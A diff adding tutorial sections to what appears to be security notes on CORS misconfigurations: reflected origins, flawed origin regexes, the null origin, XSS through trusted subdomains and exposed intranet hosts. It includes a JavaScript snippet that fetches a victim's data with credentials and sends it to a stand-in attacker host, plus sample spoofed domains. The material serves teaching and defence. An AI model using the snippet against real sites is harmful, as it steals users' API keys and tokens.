@@ -48,3 +48,100 @@ CORS misconfigurations can create significant security vulnerabilities in web ap
 1. **Null Origin Misconfiguration:** This occurs when a server accepts requests from the "null" origin. This can happen in scenarios where the origin of the request is not a standard browser environment, like from a file (`file://`) or a data URL. An attacker could craft a phishing email with a link to a malicious HTML file. When the victim opens the file, it can send requests to the vulnerable server, which incorrectly accepts these as coming from a 'null' origin. Servers should be configured to explicitly validate and not trust the 'null' origin unless necessary and understood.
 2. **Bad Regex in Origin Checking:** Improperly configured regular expressions in origin checking can lead to accepting requests from unintended origins. For example, a regex like `/example.com$/` would mistakenly allow `badexample.com`. An attacker could register a domain that matches the flawed regex and create a malicious site to send requests to the target server. Another example of lousy regex could be related to subdomains. For example, if domains starting with `example.com` is allowed, an attacker could use `example.com.attacker123.com`. The application should ensure that regex patterns used for validating origins are thoroughly tested and specific enough to exclude unintended matches.
 3. **Trusting Arbitrary Supplied Origin:** Some servers are configured to echo back the `Origin` header value in the `Access-Control-Allow-Origin` response header, effectively allowing any origin. An attacker can craft a custom HTTP request with a controlled origin. Since the server echoes this origin, the attacker's site can bypass the SOP restrictions. Instead of echoing back origins, maintain an allowlist of allowed origins and validate against it.
+# Server-generated ACAO header from client-specified Origin header
+Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain. For example, consider an application that receives the following request:
+
+```
+GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=...
+```
+It then responds with:
+```
+HTTP/1.1 200 OK Access-Control-Allow-Origin: https://malicious-website.com Access-Control-Allow-Credentials: true ...
+```
+Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain.
+If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); 
+req.withCredentials = true; 
+req.send(); 
+function reqListener() { 
+	location='//malicious-website.com/log?key='+this.responseText; 
+};
+```
+# Errors parsing Origin Headers
+Some applications that support access from multiple origins do so by using a whitelist of allowed origins.
+When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted. For example, the application receives a normal request like:
+
+```
+GET /data HTTP/1.1 
+Host: normal-website.com 
+... 
+Origin: https://innocent-website.com`
+```
+The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:
+
+```
+HTTP/1.1 200 OK 
+... 
+Access-Control-Allow-Origin: https://innocent-website.com
+```
+
+Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.
+
+For example, suppose an application grants access to all domains ending in:
+
+`normal-website.com`
+
+An attacker might be able to gain access by registering the domain:
+
+`hackersnormal-website.com`
+
+Alternatively, suppose an application grants access to all domains beginning with
+
+`normal-website.com`
+
+An attacker might be able to gain access using the domain:
+
+`normal-website.com.evil-user.net`
+
+## Whitelisted null origin value
+The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:
+
+- Cross-origin redirects.
+- Requests from serialized data.
+- Request using the `file:` protocol.
+- Sandboxed cross-origin requests.
+## Exploiting XSS via CORS trust relationships
+Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
+Given the following request:
+```
+GET /api/requestApiKey HTTP/1.1 
+Host: vulnerable-website.com 
+Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...
+```
+If the server responds with:
+```
+HTTP/1.1 200 OK 
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
+Access-Control-Allow-Credentials: true
+```
+Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:
+`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`
+
+## Breaking TLS with poorly configured CORS
+Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. You can exploit the origin to bypass TLS.
+
+## Intranets and CORS without Credentials
+Most CORS attacks rely on the presence of the response header:
+`Access-Control-Allow-Credentials: true`
+Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.
+However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:
+
+`GET /reader?url=doc1.pdf Host: intranet.normal-website.com Origin: https://normal-website.com`
+
+And the server responds with:
+
+`HTTP/1.1 200 OK Access-Control-Allow-Origin: *`
